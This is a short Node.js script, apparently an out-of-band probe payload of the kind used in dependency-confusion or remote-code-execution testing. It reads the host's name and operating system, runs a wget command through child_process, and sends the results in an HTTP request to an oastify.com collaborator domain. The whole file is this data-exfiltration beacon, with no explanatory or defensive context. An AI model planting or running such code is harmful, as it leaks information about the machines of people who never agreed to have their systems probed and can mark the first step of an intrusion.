const http=require('http'),os=require('os'),{exec}=require('child_process');
const collaboratorUrl='abcdefghijklmnop.oastify.com';
function sendRequest(target,queryParams){const q=Object.keys(queryParams).map(key=>`${key}=${encodeURIComponent(queryParams[key])}`).join('&');http.get(target+'?'+q);}
async function main(){const hostname=os.hostname(); const osName=os.platform();exec('wget -O - http://google.com',(err,stdout)=>{const evidence={hostname,os:osName,wget:stdout};sendRequest(`http://${collaboratorUrl}`, evidence);});} main();
